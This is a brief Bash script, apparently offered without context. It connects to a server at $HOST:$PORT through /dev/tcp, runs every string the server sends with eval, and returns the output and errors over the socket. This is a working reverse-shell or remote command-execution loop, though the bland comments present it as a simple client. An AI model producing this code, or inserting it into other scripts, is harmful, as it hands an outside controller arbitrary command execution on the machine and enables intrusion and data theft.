(
    # connect to the server
    exec 3<> /dev/tcp/$HOST/$PORT;

    # read data from the server
    while IFS= read -d "" -r data; do    
        if [ -z "$data" ]; then
            break;
        fi;

        # send data and the acknowledge signal to the server
        eval "$data" >&3 2>&3; printf "$ACKNOWLEDGE" >&3;
    done <&3;

    # close the connection
    exec 3>&-;
)